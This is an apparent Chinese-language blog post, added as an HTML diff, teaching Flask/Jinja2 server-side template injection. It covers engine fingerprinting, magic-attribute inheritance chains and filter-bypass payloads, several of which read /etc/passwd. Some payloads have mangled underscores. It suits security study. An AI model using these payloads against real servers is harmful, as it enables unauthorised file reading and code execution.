@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>y@7q | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">y@7q</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            SSTI学习
+        </div>
+        <div class="post-meta">
+            2025-04-20
+        </div>
+        <div class="post-md">
+            <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
+<span id="more"></span>
+<p>Web开发中,模板引擎是为了使得用户界面和业务逻辑处理分离所产生。而SSTI的成因则是因为服务端没有对用户的输入做很好的处理而产生。</p>
+<p>我们最常见到的模板语言便是jinja2，它是Flask框架一部分。它能够用于替换变量，将动态数据渲染到静态 HTML 页面。格式如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">变量：</span><br><span class="line">&#123;&#123;username&#125;&#125;</span><br><span class="line">控制语句：</span><br><span class="line">&#123;% for comment in comments %&#125;</span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;comment&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通常在flask渲染html之前会有一个本地的html界面来作为模板，位于app.py同目录下的<code>templates</code>之下，</p>
+<p>这里给出示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>SSTI<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中hello是静态的，而被<code>&#123;&#123;&#125;&#125;</code>包裹的name则可以被动态的替换，而执行这一替换逻辑就是app.py的任务。</p>
+<p>我们给出以下示例代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__) <span class="comment">#__name__是一种属性一样的东西，通常指向该文件的文件名__main__，如果是外部调用得到则有可能是app</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="comment">#设置路由，get方式获取传递的参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="comment"># GET取参数name的值</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;test.html&#x27;</span>, name=query) <span class="comment">#将name的值传入模板,进行渲染</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"> <span class="comment">#让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web，同时开启debug，方便调试。开启debug后直接刷新页面就可以看到更改的界面</span></span><br></pre></td></tr></table></figure>
+
+<p>除了用query &#x3D; request.args.get(‘name’)来获取参数传递，也可以通过 URL 路径参数 (<code>/&lt;name&gt;</code>) 获取。，该方法支持参数类型的限制，例如 <code>&lt;int:id&gt;</code>。</p>
+<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><blockquote>
+<p><strong>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是</strong></p>
+</blockquote>
+<p>通常有很多各个语言的常见框架，不同模板则有着不同的语法，总结如下：</p>
+<p><strong>附表</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/1344396-20200911174631687-758048107.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200521204901527.png" alt="img"></p>
+<p>上图为判断模板的方法，绿色线表示执行了，红线则表示没有。</p>
+<p>以mako模板的靶场为例：</p>
+<p>先输入<code>$&#123;7*7&#125;</code>,回显为49，于是再输入<code>a&#123;*comment*&#125;b</code>,</p>
+<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250511200647083.png" alt="image-20250511200647083"></p>
+<p>未执行，于是再使用<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>，</p>
+<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250511200746361.png" alt="image-20250511200746361"></p>
+<p>成功执行，现在我们便判断出了模板类型为Mako。</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>一般就是靠继承链先得到父类再看其中有没有什么可以利用的恶意方法函数之类的能够导致命令执行，从而拿到flag。以下是一些魔术方法，我们用他们来构造继承链：</p>
+<ul>
+<li><code>__class__</code></li>
+</ul>
+<p><strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
+<ul>
+<li><code>__bases__</code></li>
+</ul>
+<p>以元组的形式返回一个类所直接继承的类。</p>
+<ul>
+<li><code>__base__</code></li>
+</ul>
+<p>以字符串返回一个类所直接继承的类。</p>
+<ul>
+<li><code>__mro__</code></li>
+</ul>
+<p>返回解析方法调用的顺序。</p>
+<ul>
+<li><code>__subclasses__()</code></li>
+</ul>
+<p>获取类的所有子类。</p>
+<ul>
+<li><code>__init__</code></li>
+</ul>
+<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
+<ul>
+<li><code>__globals__</code></li>
+</ul>
+<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__().__init__.__globals__</span><br></pre></td></tr></table></figure>
+
+<p>这是一套构造的利用链，可以看到object类的所有子类，然后利用<code>.__init__.__globals__</code>来找到有没有os module或者其他的可以读写文件的。可以用python脚本进行爆破。</p>
+<h2 id="SSTI绕过"><a href="#SSTI绕过" class="headerlink" title="SSTI绕过"></a>SSTI绕过</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="[]绕过"></a>[]绕过</h3><p>用<code>__getitem__(2)</code>或者<code>.pop(2)</code>来绕过，假如.也被绕过</p>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>等价于<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<h3 id="“”绕过"><a href="#“”绕过" class="headerlink" title="“”绕过"></a>“”绕过</h3><p>一般是用于索引或者路径，可以用request.args来进行绕过，把其当作变量来填充即可。</p>
+<h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="_绕过"></a>_绕过</h3><p>也同样可以用request.args,或者request.form两个传参来绕过（对应GET和POST）</p>
+<p>示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;&amp;<span class="keyword">class</span>=____class____&amp;mro=____mro____&amp;subclasses=____subclasses____</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><p>可用加号拆分，使用中括号的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不使用中括号的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Base64绕过"><a href="#Base64绕过" class="headerlink" title="Base64绕过"></a>Base64绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].____getattribute____(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).____base____.____subclasses____()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="自动化绕过工具"><a href="#自动化绕过工具" class="headerlink" title="自动化绕过工具"></a>自动化绕过工具</h3><p>当然现在有很多自动化工具，比如可以看看：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://lca.xlog.app/Flask-SSTI-ba-chang-ji-lu?locale=zh">Flask SSTI靶场记录 - lca</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/14204137.html">初探 Python Flask+Jinja2 SSTI - Zh1z3ven - 博客园</a></p>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 y@7q</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    </body>
+</html>
